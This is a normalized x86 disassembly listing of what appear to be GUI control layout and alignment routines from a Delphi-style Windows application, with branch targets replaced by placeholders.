or ebx 0x2
sub_44c304
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_44c330
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_406e68
mov eax esp
call sub_4191ec
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_449afc
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403450
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403450
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_449b28
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_4191ec
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_419174
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_449ad0
sub_44c458
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_44c498
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448cfc
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_44c4cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44c5c4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4490b8
push ebx
push sub_44df5c
call sub_421054
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423aec
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_423c94
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403578
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468b44
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ff8
lea eax [ ebx + 0x188 ]
call sub_403fa4
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c5cb
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_44c5cb
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_44c5f0
push ebx
push esi
push edi
call sub_4035e0
mov ebx edx
mov edi eax
mov eax edi
call sub_420264
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405a08
mov eax [ edi + 0x178 ]
call sub_403254
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_447c64
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_44d290
mov eax edi
call sub_44d4d0
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403254
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_44d494
mov esi eax
mov edx esi
mov eax edi
call sub_44d2fc
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_44d4d0
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_449190
test bl bl
jle r-xdata
call sub_4210ec
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c8
sub_44c6c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_44c784
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41a770
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_450998
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41a5d0
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41a6c4
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a5d0
test eax eax
je r-xdata
sub_44c794
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d038
xor eax eax
push ebp
push sub_44c7d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4493f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c7db
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
sub_44c7db
mov eax [ ebp - 0x4 ]
call sub_44c6c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44de94
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_44b16c
sub_44c810
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_44c82b ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_44c89c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_419174
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44cc1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc24
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_44cb32 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call sub_40651c
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_44ca95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call sub_40651c
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_44cc24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_44cc53 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44ccdc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d4d0
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41a474
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_41a5d0
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_44c89c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_44d494
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_41a64c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_41a5d0
mov edx eax
mov ecx ebx
mov eax edi
call sub_44c810
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44ce4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_44d4d0
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_44d494
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_44d494
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_44cea0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44ce4c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44cf7f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44ccdc
pop ecx
push ebp
mov al 0x2
call sub_44ccdc
pop ecx
push ebp
mov al 0x3
call sub_44ccdc
pop ecx
push ebp
mov al 0x4
call sub_44ccdc
pop ecx
push ebp
mov al 0x5
call sub_44ccdc
pop ecx
push ebp
mov al 0x6
call sub_44ccdc
pop ecx
push ebp
xor eax eax
call sub_44ccdc
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403450
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_44cfa4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d038
xor eax eax
push ebp
push sub_44d02b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_44d068
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d12d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d134
mov eax [ ebp - 0xc ]
call sub_403254
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a474
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_449728
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_41a5d0
xor ecx ecx
mov edx 0xb03e
call sub_44b16c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_44d13c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d4d0
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44d038
xor edx edx
push ebp
push sub_44d223
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edx eax
mov eax [ ebp - 0xc ]
call sub_41a474
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_41a5d0
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d494
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_4494cc
mov dl 0x4
call sub_4494cc
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41a4c0
sub_44d290
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_461dc8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_465be4
sub_44d2b0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4488ac
lea eax [ esi + 0x19c ]
mov edx ebx
